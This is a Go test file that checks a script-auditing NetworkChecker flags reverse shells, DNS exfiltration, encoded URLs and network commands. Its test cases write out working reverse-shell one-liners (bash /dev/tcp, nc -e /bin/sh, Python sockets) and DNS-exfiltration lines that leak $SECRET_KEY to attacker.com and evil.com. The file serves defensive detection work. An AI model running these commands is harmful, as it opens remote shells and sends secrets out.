// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"testing"
)

func TestNetworkChecker_ReverseShell(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{"bash_devtcp", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"},
		{"nc_reverse", "nc -e /bin/sh 10.0.0.1 4242"},
		{"python_socket", "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.0.0.1\",4242))'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewNetworkChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasCritical := false
			for _, f := range findings {
				if f.Severity == SeverityCritical && f.Title == "Reverse shell pattern detected" {
					hasCritical = true
				}
			}
			if !hasCritical {
				t.Errorf("expected Critical reverse shell finding for %q", tt.name)
			}
		})
	}
}

func TestNetworkChecker_DNSExfiltration(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{"subshell_expansion", "dig $(echo $SECRET_KEY).attacker.com"},
		{"lowercase_variable", "dig $secret_key.evil.com"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewNetworkChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasDNS := false
			for _, f := range findings {
				if f.Title == "Possible DNS exfiltration pattern" {
					hasDNS = true
				}
			}
			if !hasDNS {
				t.Errorf("expected DNS exfiltration finding for %q", tt.name)
			}
		})
	}
}

func TestNetworkChecker_EncodedURL(t *testing.T) {
	t.Parallel()

	// "aHR0c" is the base64 prefix of "http"
	sc := newSingleScriptContext("echo aHR0cHM6Ly9leGFtcGxlLmNvbQ== | base64 -d")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasEncoded := false
	for _, f := range findings {
		if f.Title == "Script contains encoded URL" {
			hasEncoded = true
		}
	}
	if !hasEncoded {
		t.Error("expected encoded URL finding")
	}
}

func TestNetworkChecker_NetworkCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{"wget", "wget https://example.com/data.json -O output.json"},
		{"aria2c", "aria2c http://example.com/large"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewNetworkChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasNetwork := false
			for _, f := range findings {
				if f.Title == "Script uses network access command" {
					hasNetwork = true
				}
			}
			if !hasNetwork {
				t.Errorf("expected network command finding for %q", tt.name)
			}
		})
	}
}

func TestNetworkChecker_ReverseShellMultiline(t *testing.T) {
	t.Parallel()

	// Multi-line Python reverse shell spread across lines within a -c argument.
	script := "python3 -c '\nimport socket\ns=socket.socket()\ns.connect((\"10.0.0.1\",4242))\n'"
	sc := newSingleScriptContext(script)
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasCritical := false
	for _, f := range findings {
		if f.Severity == SeverityCritical && f.Title == "Reverse shell pattern detected" {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected Critical reverse shell finding for multi-line Python payload")
	}
}

func TestNetworkChecker_ReverseShellVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name   string
		script string
	}{
		{"bash_nospace", "bash -i>& /dev/tcp/10.0.0.1/4242 0>&1"},
		{"ncat_exec", "ncat -e /bin/sh 10.0.0.1 4242"},
		{"nc_cflag", "nc -c /bin/bash 10.0.0.1 4242"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewNetworkChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasCritical := false
			for _, f := range findings {
				if f.Severity == SeverityCritical && f.Title == "Reverse shell pattern detected" {
					hasCritical = true
				}
			}
			if !hasCritical {
				t.Errorf("expected Critical reverse shell finding for %q", tt.name)
			}
		})
	}
}

func TestNetworkChecker_DNSExfiltrationBacktick(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("dig `hostname -f`.evil.com")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasDNS := false
	for _, f := range findings {
		if f.Title == "Possible DNS exfiltration pattern" {
			hasDNS = true
		}
	}
	if !hasDNS {
		t.Error("expected DNS exfiltration finding for backtick subshell variant")
	}
}

func TestNetworkChecker_Clean(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("echo hello && ls -la")
	checker := NewNetworkChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("clean script produced %d findings, want 0", len(findings))
	}
}
